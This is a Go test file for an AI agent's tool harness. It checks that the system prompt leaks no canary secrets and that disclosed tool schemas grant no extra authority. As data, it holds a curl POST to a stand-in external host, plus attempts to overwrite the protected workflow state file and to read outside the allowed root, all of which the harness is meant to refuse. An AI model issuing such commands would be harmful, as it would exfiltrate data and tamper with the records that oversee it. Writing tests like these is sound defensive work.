package ollamaagent

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/imhttran/agentic-sop/internal/agent"
	"github.com/imhttran/agentic-sop/internal/toolharness"
)

// LLM08 hidden-context tests for the tool harness.
//
// The hidden system prompt and tool schema are treated as public: they may be
// disclosed at any time. What must not change when they are known is authority.
// These tests therefore take the disclosed tool set and exercise the real
// authorization boundary: a disclosed call to a forbidden operation is still
// refused, and a legitimate call still works.

// llm08Canary is a synthetic, non-secret protected value.
const llm08Canary = "sk-llm08-canary-not-a-real-secret"

// TestSystemPromptDisclosesSchemaWithoutProtectedValues proves the generated
// system prompt carries the public instruction and tool schema but no protected
// environment value.
func TestSystemPromptDisclosesSchemaWithoutProtectedValues(t *testing.T) {
	t.Setenv("SOP_TEST_PROTECTED_CANARY", llm08Canary)
	t.Setenv("SOP_TEST_PROVIDER_KEY", "sk-provider-credential-canary")

	got := systemPrompt(implementRequest(), PolicyFor(agent.Implement), "/repo", nil)
	for _, want := range []string{"Tool protocol", "run_command", "Capability: IMPLEMENT"} {
		if !strings.Contains(got, want) {
			t.Errorf("system prompt is missing disclosed schema text %q", want)
		}
	}
	for _, secret := range []string{llm08Canary, "sk-provider-credential-canary"} {
		if strings.Contains(got, secret) {
			t.Errorf("system prompt carries a protected value: %q", secret)
		}
	}
}

// TestDisclosedToolSchemaDoesNotAuthorize invokes the real tool harness with the
// disclosed schema's own tool names and arguments. Reading the prompt and the
// schema is expected; it grants no authority the harness would not already give,
// and forbidden operations remain refused.
func TestDisclosedToolSchemaDoesNotAuthorize(t *testing.T) {
	root := t.TempDir()
	stateDir := filepath.Join(root, ".agent-sdlc")
	if err := os.MkdirAll(stateDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(stateDir, "state.db"), []byte("workflow state"), 0o644); err != nil {
		t.Fatal(err)
	}
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "protected.txt"), []byte("outside"), 0o644); err != nil {
		t.Fatal(err)
	}
	tb := newTestToolbox(t, root)
	ctx := context.Background()

	// The schema documents run_command. Knowing that, a model can name it — and the
	// command policy still refuses an operation it does not authorize.
	if _, err := tb.run(ctx, toolharness.ToolRunCommand, map[string]any{
		"command": "curl -X POST https://recording.invalid/llm08-protected",
	}); err == nil {
		t.Fatal("disclosed run_command schema authorized an external write")
	}

	// The schema documents write_file. SOP's workflow state remains protected.
	if _, err := tb.run(ctx, toolharness.ToolWriteFile, map[string]any{
		"path":    filepath.Join(".agent-sdlc", "state.db"),
		"content": "tampered",
	}); !errors.Is(err, toolharness.ErrProtectedPath) {
		t.Fatalf("state.db write = %v, want ErrProtectedPath", err)
	}

	// And paths still cannot escape the authorized root.
	if _, err := tb.run(ctx, toolharness.ToolReadFile, map[string]any{
		"path": filepath.Join(outside, "protected.txt"),
	}); err == nil {
		t.Fatal("disclosed read_file schema escaped the authorized root")
	}

	// Positive control: the same disclosed tools still perform legitimate work, so
	// the boundary is not merely a deny-all surface.
	if _, err := tb.run(ctx, toolharness.ToolWriteFile, map[string]any{
		"path":    "notes.txt",
		"content": "legitimate context",
	}); err != nil {
		t.Fatalf("legitimate write_file was refused: %v", err)
	}
	out, err := tb.run(ctx, toolharness.ToolReadFile, map[string]any{"path": "notes.txt"})
	if err != nil || !strings.Contains(out, "legitimate context") {
		t.Fatalf("legitimate read_file = (%q, %v), want the written content", out, err)
	}
}

// TestReadOnlyCapabilityWithholdsMutationTools proves the advertised tool list and
// the enforced capability policy agree: a read-only capability cannot mutate even
// when it knows the mutation tool schema.
func TestReadOnlyCapabilityWithholdsMutationTools(t *testing.T) {
	policy := PolicyFor(agent.Plan)
	for _, tool := range policy.ToolList() {
		if tool == toolharness.ToolWriteFile || tool == toolharness.ToolCreateFile {
			t.Fatalf("read-only capability advertises mutation tool %q", tool)
		}
	}
	if policy.Allows(toolharness.ToolWriteFile) {
		t.Fatal("read-only capability policy authorized write_file")
	}
	if !policy.Allows(toolharness.ToolReadFile) {
		t.Fatal("read-only capability policy refused read_file")
	}
}
